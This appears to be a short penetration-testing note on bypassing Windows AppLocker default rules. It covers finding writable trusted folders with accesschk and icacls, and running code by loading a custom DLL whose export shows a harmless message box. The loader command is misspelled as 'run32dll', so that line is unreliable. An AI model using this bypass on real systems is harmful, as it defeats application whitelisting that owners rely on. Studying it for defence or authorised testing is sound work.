**TRUSTED FOLDERS:**

Default AppLocker rules only allows to execute programs located under these directories: C:\Program Files, C:\Program Files (x86), and C:\Windows.

However there may be subdirectories under C:\Program Files, C:\Program Files (x86), or C:\Windows that may have write and executable permisions. To do so we will use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
in conjuction with icacls:

```
1. accesschk.exe <user_name> C:\Windows -wus
2. icacls <directory>  -> on the posible directories to check if they got executable permision
```

**BYPASS WITH DLLs:**

The default ruleset doesnâ€™t protect against loading arbitrary DLLs. So if we create an unmangaed DLL, we load it and then call methods of that unmanaged DLL, we could gain code execution:

```
1st Create an unmanaged DLL:
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)

{
  switch (ul_reason_for_call)
  {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
  MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}

2nd Compile the DLL

3rd Load and execute the run method of the DLL

C:\> run32dll testdll.dll,run
```
